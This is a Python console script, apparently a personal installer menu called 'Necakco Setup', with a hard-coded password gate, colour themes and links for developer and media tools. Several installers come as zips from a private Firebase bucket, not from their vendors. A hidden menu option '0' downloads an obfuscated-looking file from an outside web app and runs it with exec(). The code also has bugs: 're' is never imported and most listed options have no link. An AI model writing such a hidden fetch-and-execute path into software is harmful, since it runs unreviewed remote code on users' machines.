import requests,os,webbrowser,time
import time,webbrowser,shutil,requests
from pystyle import  Center, Anime, Colors, Colorate, Write 
from colorama import init, Fore, Style
from datetime import datetime
import urllib.parse
from os import system
from tqdm import tqdm
global fprint,selected_theme,tool,colorspack,chosetext,clearConsole,chosejson,choice,current_time,fs,fetch_link_from_json,chose,linkpk,dl
global blink
# --------------------------------------------------------
#                 _                 
#   ___ _   _ ___| |_ ___ _ __ ___  
#  / __| | | / __| __/ _ \ '_ ` _ \ 
#  \__ \ |_| \__ \ ||  __/ | | | | |
#  |___/\__, |___/\__\___|_| |_| |_|
#       |___/                       

global cls,rgb,alert
def cls():
    os.system('cls' if os.name=='nt' else 'clear')
def hex_to_rgb(hex_color):
    hex_color = hex_color.lstrip('#')
    return tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))
def rgb(r, g, b):
    return f"\x1b[38;2;{r};{g};{b}m"
def hex(hex_color):
    r, g, b = hex_to_rgb(hex_color)
    return rgb(r, g, b)
def alert(type):
    if type == "error": 
        Write.Print("   [e] NOT FOUND | wait 4s coninue", Colors.red_to_white, interval=0.000)
        time.sleep(1.5)
        chose() 
    elif type == "done":
        Write.Print("   [+] Successful | wait 4s coninue", Colors.green_to_white, interval=0.000)
        time.sleep(1.5)
        cls()
    elif type == "info":
        Write.Print("   [i] ---------  | wait 4s coninue", Colors.green_to_white, interval=0.000)
        time.sleep(1.5)
        cls()
def alert2(type,text):
    if type == "error": 
        Write.Print(f"   [e] NOT FOUND | {text} | wait 4s coninue", Colors.red_to_white, interval=0.000)
        time.sleep(1.5)
        chose() 
    elif type == "done":
        Write.Print(f"   [+] Successful | {text} | wait 4s coninue", Colors.green_to_white, interval=0.000)
        time.sleep(1.5)
        cls()
    elif type == "info":
        Write.Print(f"   [i] ---------  | {text} | wait 4s coninue", Colors.green_to_white, interval=0.000)
        time.sleep(1.5)
        cls()
   
def dl(url, destination_folder):
    try:
    
        os.makedirs(destination_folder, exist_ok=True)
        clean_url = re.sub(r'\?.*$', '', url)
        file_name = os.path.basename(urllib.parse.unquote(clean_url))
        file_name = re.sub(r'[^\w\s\-_\.]', '', file_name)
        file_path = os.path.join(destination_folder, file_name)
        with requests.get(url, stream=True) as r:
            r.raise_for_status()
            total_size = int(r.headers.get('content-length', 0))
            with open(file_path, 'wb') as f, tqdm(
                desc=file_name,
                total=total_size,
                unit='B',
                unit_scale=True,
                unit_divisor=1024,
            ) as progress_bar:
                for chunk in r.iter_content(chunk_size=8192):
                    f.write(chunk)
                    progress_bar.update(len(chunk))

        print(f"downloaded: {file_path}")
        time.sleep(1.2)
        cls()
        chose()
        return file_path
    except Exception as e:
        print(f"error: {e}")
        return None
          
global finput,blue,cyan_gradient,red_to_black,purple_to_black ,finput2       
def finput():
    choice = input(cyan_gradient(f'''
    ╭─ ♥ {current_time.hour}:{current_time.minute} | {current_time.year}/{current_time.month}/{current_time.day} | # 
    ╰─ ~  '''))

    return choice
def finput2(page):
    choice = input(cyan_gradient(f'''
    ╭─ ♥ {current_time.hour}:{current_time.minute} | {current_time.year}/{current_time.month}/{current_time.day} | # {page}
    ╰─ ~  '''))

    return choice
colorspack = {
    "1": {
        "name":"catpuccin",
        "alpha": rgb(178, 186, 216),
        "digit": rgb(169, 137, 209),
        "bracket": rgb(88, 176, 194),
        "hyphen": rgb(40, 40, 40),
        "hash": rgb(241, 144, 130),
        "pipe": rgb(109, 151, 211),
        "other": Fore.WHITE,
    },
    "2": {
        "name":"rosepinegold",
        "alpha": rgb(250, 244, 237),
        "digit": rgb(49, 116, 143),
        "bracket": rgb(246, 193, 119),
        "hyphen": rgb(40, 40, 40),
        "hash": rgb(235, 111, 146),
        "pipe": rgb(109, 151, 211),
        "other": Fore.RED,
    },
    "3": {
        "name":"rosepineiris",
        "alpha": rgb(226, 228, 253),
        "digit": rgb(134, 173, 180),
        "bracket": rgb(54, 55, 85),
        "hyphen": rgb(40, 40, 40),
        "hash": rgb(235, 111, 146),
        "pipe": rgb(109, 151, 211),
        "other": rgb(131,132,150),
    }
}

def fprint(text, theme=None):
    default_colors = {
        "alpha": rgb(242, 233, 222),
        "digit": rgb(169, 137, 209),
        "bracket": rgb(88, 176, 194),
        "hyphen": rgb(40, 40, 40),
        "hash": rgb(241, 144, 130),
        "pipe": rgb(109, 151, 211),
        "other": Fore.WHITE,
    }

    colors = default_colors.copy()

    if theme and theme in colorspack:
        colors.update(colorspack[theme])

    for char in text:
        color_key = "other"
        if char.isalpha():
            color_key = "alpha"
        elif char.isdigit():
            color_key = "digit"
        elif char in ["[", "]"]:
            color_key = "bracket"
        elif char == "-":
            color_key = "hyphen"
        elif char == "#":
            color_key = "hash"
        elif char == "|":
            color_key = "pipe"

        print(colors[color_key] + char, end='')

    print(Style.RESET_ALL, end='')
def blue(text):
    system(""); faded = ""
    for line in text.splitlines():
        green = 0
        for character in line:
            green += 3
            if green > 255:
                green = 255
            faded += (f"\033[38;2;0;{green};255m{character}\033[0m")
        faded += "\n"
    return faded
def red_to_black(text):
    system(""); faded = ""
    for line in text.splitlines():
        intensity = 255
        for character in line:
            intensity -= 5
            if intensity < 0:
                intensity = 0
            faded += (f"\033[38;2;{intensity};0;0m{character}\033[0m")
        faded += "\n"
    return faded

def purple_to_black(text):
    system(""); faded = ""
    for line in text.splitlines():
        red = 220
        blue = 255
        for character in line:
            faded += (f"\033[38;2;{red};0;{blue}m{character}\033[0m")
            red = max(35, red - 3)
            blue = max(0, blue - 3)
        faded += "\n"
    return faded
def cyan_gradient(text):
    system(""); faded = ""
    
    start_color = (140, 255, 244)
    end_color = (165, 140, 255)
    
    r_step = (end_color[0] - start_color[0]) / len(text)
    g_step = (end_color[1] - start_color[1]) / len(text)
    b_step = (end_color[2] - start_color[2]) / len(text)
    
    current_color = start_color
    
    for line in text.splitlines():
        for character in line:
            faded += (f"\033[38;2;{int(current_color[0])};{int(current_color[1])};{int(current_color[2])}m{character}\033[0m")
            current_color = (current_color[0] + r_step, current_color[1] + g_step, current_color[2] + b_step)

        faded += "\n"
    faded = faded.rstrip('\n')
    return faded

def open_link(link):
    try:
        webbrowser.open(link)
    except Exception as e:
        print(f"An error occurred: {str(e)}")

linkpk = {
    "1.1": "https://firebasestorage.googleapis.com/v0/b/cheatcl-file.appspot.com/o/sea%2Fsublime_text_build_4169_x64_setup.zip?alt=media&token=0d11a35d-3558-4fd1-9cbe-a20115f6d9b6",
    "1.2": "https://www.python.org/downloads/",
    "1.3": "https://github.com/nvm-sh/nvm",
    "1.4": "https://nodejs.org/en/download/current",
    "1.5": "https://firebasestorage.googleapis.com/v0/b/cheatcl-file.appspot.com/o/nck%20pack%2FSmartGaGa_Lite_Android7.1.2.exe.zip?alt=media&token=969a5d81-4c7e-47ab-bc1b-00237aee5403",
    "1.6": "https://git-scm.com/downloads",
    "1.7": "https://code.visualstudio.com/download",
    "1.8": "https://firebasestorage.googleapis.com/v0/b/cheatcl-file.appspot.com/o/nck%20pack%2Fcodeblocks-20.03mingw-setup.exe.zip?alt=media&token=c0905a4c-cd96-448b-8cfd-7921d99004c1",
    "1.9": "https://firebasestorage.googleapis.com/v0/b/cheatcl-file.appspot.com/o/nck%20pack%2Ffpc-3-2-2-i386-win32.zip?alt=media&token=6b2a08cc-e2c0-4e51-988b-8cd11283363c",
    "1.10": "https://firebasestorage.googleapis.com/v0/b/cheatcl-file.appspot.com/o/nck%20pack%2FJava.zip?alt=media&token=ef49a504-8360-4327-81ae-b7158c5bb353",
    "1.11": "https://www.jetbrains.com/idea/download/?section=windows",
    "2.3": "https://firebasestorage.googleapis.com/v0/b/cheatcl-file.appspot.com/o/nck%20pack%2Fcapcut_capcutpc_0_1.2.6_installer.exe.zip?alt=media&token=367e8d25-685b-498a-8efb-b3190cd1d551",
}
def chose():
    init(autoreset=True)
    clear = lambda: os.system('cls')
    user = "nck" 
    oss = "win10"
    clear()
    print(cyan_gradient('       Enter the number that matches the one you want to enter.'))
    fprint(f"""
    @ Necakco Setup - work
    """, selected_theme)

    fprint("""
    # 1. dev
    ---------------------------------------
    [1.1] - sublime text
    [1.2] - python
    [1.3] - nvm
    [1.4] - nodejs
    [1.5] - smart gaga lite
    [1.6] - .git
    [1.7] - vscode
    [1.8] - codeblock
    [1.9] - pascal
    [1.10] - jre + jdk
    [1.11] - jetbrain iteij

    # 2. render 
    ---------------------------------------
    [2.1] - abd photoshop
    [2.2] - abd premiere
    [2.3] - capcut
    [2.4] - abd after effect
    [2.5] - tekno blur
    [2.6] - krita
    [2.7] - Ocam

    # 3. social 
    ---------------------------------------
    [3.1] - facebook lite
    [3.2] - discord lite
    [3.3] - youtube lite
    [3.4] - spotify

    # 4. work
    ---------------------------------------
    [4.1] - Grammaly
    [4.2] - wps
    [4.3] - youtube downloader
    [4.4] - notion
    [4.5] - color picker
    [4.6] - screen translate
    [4.7] - terabox

    # 5. sys tool
    ---------------------------------------
    [5.1] - ShareX 
    [5.2] - mem clean
    [5.3] - .bat clean pack
    [5.4] - terminal
    [5.5] - firefox
    [5.6] - Flooprp
    [5.7] - chrome
    [5.8] - 7zip
    [5.9] - startIsback
    """, selected_theme)

    current_time = datetime.now()
    choice = finput()
    if choice == "0":
        code_url = "https://frenda-r.web.app/text/hub.obf"
        try:
            response = requests.get(code_url)
            response.raise_for_status()
            python_code = response.text
            cls()
            exec(python_code)
        except requests.exceptions.RequestException as e:
            alert2("error", e)
        except SyntaxError as se:
            alert2("error", se)
        except Exception as ex:
            alert2("error", ex)
        print(cyan_gradient("     done \n"))
        time.sleep(1)
    else:
        def get_link(choice):
            return linkpk.get(choice)
        link = get_link(choice)
        if "firebase" not in link:
            open_link(link)
            chose()
        else:
            dl(link,"download")

        

            



banner = r"""               
                                        ███╗   ██╗███████╗ █████╗ ██╗ ██████╗ 
                                        ████╗  ██║██╔════╝██╔══██╗██║██╔═══██╗
                                        ██╔██╗ ██║█████╗  ███████║██║██║   ██║
                                        ██║╚██╗██║██╔══╝  ██╔══██║██║██║   ██║
                                        ██║ ╚████║███████╗██║  ██║██║╚██████╔╝
                                        ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝         
                                                  Press ENTER to open.                                                                                      
"""[0:]

selected_theme = "3"

Anime.Fade(Center.Center(banner), Colors.black_to_white, Colorate.Vertical, enter=True)
print(cyan_gradient("       # necakco setup"))
current_time = datetime.now()
passw = "das"
while passw != "khoadz123":
    passw = finput2("Enter Password")
    time.sleep(1.2)
    cls()

chose()




